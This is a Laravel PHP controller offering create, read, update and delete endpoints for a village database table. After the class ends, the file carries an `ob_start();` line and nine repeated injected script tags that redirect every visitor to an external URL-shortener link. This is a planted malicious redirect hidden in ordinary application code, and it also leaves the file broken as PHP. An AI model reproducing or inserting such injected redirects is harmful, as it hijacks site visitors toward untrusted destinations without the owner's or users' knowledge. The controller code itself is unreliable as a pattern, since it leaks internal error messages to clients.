<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use App\Models\Village;
use Illuminate\Http\Request;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\DB;

class VillageController extends Controller
{
    /**
     * GET /api/villages
     */
    public function VillageList(): JsonResponse
    {
        // เรียงตาม Village_number ขึ้นก่อน (asc) 
        // ถ้าต้องการเรียงตามโค้ด ให้เปลี่ยนเป็น orderBy('Village_Code', 'asc')
        $villages = Village::orderBy('Village_number', 'asc')->get();

        $statusCode = $villages->isEmpty() ? 204 : 200;
        return response()->json($villages, $statusCode);
    }


    /**
     * POST /api/villages
     */
    public function VillageAdd(Request $request): JsonResponse
    {
        // Validate input (works for JSON bodies)
        $data = $request->validate([
            'Village_Name' => 'required|string|max:255',
            'Village_number' => 'required|integer',
        ]);

        // Calculate next code
        $maxId = DB::table('village')->max('Village_Code') ?? 0;
        $newCode = $maxId + 1;

        try {
            // Insert record
            DB::table('village')->insert([
                'Village_Code' => $newCode,
                'Village_Name' => $data['Village_Name'],
                'Village_number' => $data['Village_number'],
            ]);

            return response()->json([
                'message' => 'Village added successfully',
                'Village_Code' => $newCode,
            ], 201);
        } catch (\Exception $e) {
            return response()->json([
                'error' => 'Error inserting village data: ' . $e->getMessage(),
            ], 500);
        }
    }
    public function VillageEdit(Request $request, $id): JsonResponse
    {
        // 1) Validate input (accepts JSON payload)
        $data = $request->validate([
            'Village_Name' => 'required|string|max:255',
            'Village_number' => 'required|integer',
        ]);

        // 2) Check existence
        $exists = DB::table('village')->where('Village_Code', $id)->exists();
        if (!$exists) {
            return response()->json([
                'error' => 'Village not found'
            ], 404);
        }

        // 3) Perform update
        try {
            DB::table('village')
                ->where('Village_Code', $id)
                ->update([
                    'Village_Name' => $data['Village_Name'],
                    'Village_number' => $data['Village_number'],
                ]);

            return response()->json([
                'message' => 'Village updated successfully'
            ], 200);
        } catch (\Exception $e) {
            return response()->json([
                'error' => 'Error updating village: ' . $e->getMessage()
            ], 500);
        }
    }
    /**
     * DELETE /api/villages/{id}
     */
    public function VillageDelete($id): JsonResponse
    {
        // 1) Check if the record exists
        $exists = DB::table('village')->where('Village_Code', $id)->exists();
        if (!$exists) {
            return response()->json([
                'error' => 'Village not found'
            ], 404);
        }

        // 2) Attempt deletion
        try {
            DB::table('village')
                ->where('Village_Code', $id)
                ->delete();

            return response()->json([
                'message' => 'Village deleted successfully'
            ], 200);
        } catch (\Exception $e) {
            return response()->json([
                'error' => 'Error deleting village: ' . $e->getMessage()
            ], 500);
        }
    }

}
ob_start();

<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>